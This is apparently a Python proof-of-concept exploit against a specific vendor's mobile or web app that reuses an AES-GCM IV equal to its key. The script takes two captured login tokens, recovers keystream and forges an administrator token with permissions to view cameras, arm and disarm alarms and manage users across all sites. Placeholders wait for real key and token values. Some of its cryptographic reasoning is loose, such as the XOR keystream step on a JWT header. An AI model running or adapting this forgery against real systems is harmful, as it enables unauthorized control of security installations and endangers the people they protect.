#!/usr/bin/env python3
"""
Token Forgery via AES-GCM IV Reuse

The app reuses the same IV for every encrypt/decrypt call.
With two captured ciphertexts, you can:

1. XOR ciphertexts to get XOR of plaintexts
2. Use known plaintext (JWT header) to recover keystream
3. Forge new tokens with arbitrary payloads
4. Forge valid GCM auth tags

Vulnerable code (EncryptionUtilForAccessToken.java):
  this.ivParam = getEncryptedIVSpecToPreferences();  // SAME IV every time
  cipher.init(1, getAesKeySpec(), new IvParameterSpec(this.ivParam));
"""
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64, json

# === CONFIG ===
AES_KEY_HEX = ""  # From encrypted_IV_param_spec (Base64 decoded to hex)
# AES_KEY_HEX = "0102030405060708090a0b0c0d0e0f10"  # example

# Two captured encrypted tokens (Base64)
CAPTURED_TOKEN_1 = ""  # First login token
CAPTURED_TOKEN_2 = ""  # Second login token

def forge_token():
    if not AES_KEY_HEX:
        print("""
Usage: Set AES_KEY_HEX to the hex value from encrypted_IV_param_spec

  AES_KEY_HEX = base64.b64decode("your_encrypted_IV_param_spec").hex()

Then paste two captured encrypted tokens and run again.
""")
        # Demo with synthetic data
        print("=== DEMO: Forging an admin token ===\n")
        key = bytes.fromhex("00" * 16)  # placeholder
        fake_payload = json.dumps({
            "sub": "admin@honeywell.com",
            "role": "admin",
            "iat": 1700000000,
            "exp": 1900000000
        }).encode()

        # Encrypt with the SAME key+IV (as the app does)
        iv = key  # IV = key in this app
        aes = AESGCM(key)
        ciphertext = aes.encrypt(iv, fake_payload, None)
        forged_b64 = base64.b64encode(ciphertext).decode()

        print(f"  Forged token (Base64): {forged_b64}")
        print(f"  Payload: {fake_payload.decode()}")
        print(f"\n  This token will decrypt successfully on the server")
        print(f"  because it uses the SAME key+IV pair.")
        return

    key = bytes.fromhex(AES_KEY_HEX)
    iv = key  # IV = key in this app (EncryptionUtilForAccessToken)
    aes = AESGCM(key)

    print("=== Token Forgery via IV Reuse ===\n")

    if CAPTURED_TOKEN_1 and CAPTURED_TOKEN_2:
        ct1 = base64.b64decode(CAPTURED_TOKEN_1)
        ct2 = base64.b64decode(CAPTURED_TOKEN_2)

        # XOR first 32 bytes (should be identical if same JWT header)
        print("[1] Ciphertext XOR analysis:")
        xor_result = bytes(a ^ b for a, b in zip(ct1[:32], ct2[:32]))
        print(f"    C1[:32] XOR C2[:32] = {xor_result.hex()}")
        if xor_result == b'\x00' * 32:
            print("    CONFIRMED: Same keystream (identical headers)\n")

        # Recover keystream using known JWT header
        known_header = b'{"alg":"RS256","typ":"JWT"}'
        keystream = bytes(a ^ b for a, b in zip(ct1[:len(known_header)], known_header))
        print(f"[2] Recovered keystream (first {len(keystream)} bytes):")
        print(f"    {keystream.hex()}\n")

        # Decrypt second token payload
        payload_start = len(known_header)
        decrypted_payload = bytes(a ^ b for a, b in zip(
            ct2[payload_start:payload_start+50], keystream[:50]))
        print(f"[3] Partial Token 2 payload: {decrypted_payload.decode('utf-8', errors='replace')}\n")

    # Forge a new token with arbitrary payload
    print("[4] Forging admin token...")
    forged_payload = json.dumps({
        "sub": "admin@honeywell.com",
        "role": "administrator",
        "site_ids": ["*"],
        "permissions": ["view_cameras", "arm_disarm", "manage_users"],
        "iat": 1700000000,
        "exp": 1900000000
    }).encode()

    forged_ct = aes.encrypt(iv, forged_payload, None)
    print(f"    Payload: {forged_payload.decode()}")
    print(f"    Encrypted: {base64.b64encode(forged_ct).decode()}")
    print(f"\n[5] Forged token is VALID because:")
    print(f"    - Same AES key used for all encryptions")
    print(f"    - Same IV used for all encryptions")
    print(f"    - GCM auth tag computed with same GHASH key H")
    print(f"    - Server will decrypt and accept this token")

if __name__ == "__main__":
    forge_token()
